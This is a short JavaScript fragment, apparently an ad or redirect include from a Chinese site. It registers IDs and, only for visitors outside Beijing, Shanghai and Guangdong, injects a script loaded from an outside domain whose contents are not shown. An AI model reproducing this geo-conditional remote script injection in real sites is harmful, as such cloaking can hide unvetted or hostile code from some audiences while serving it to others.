var uids = uids || [];
var urd = urd || [];
var screen_baidu = false;
var screen_direct = false;
uids.push('a86bd91a218745af2b9474a1a0008f7c');
urd.push('288');
if (lo.indexOf("北京") == -1 && lo.indexOf("上海") == -1 && lo.indexOf("广东") == -1) {
    document.writeln("<script type=\"text/javascript\" src=\"https://code.ljwit.com/return_urls.js\"><\/script>");
}



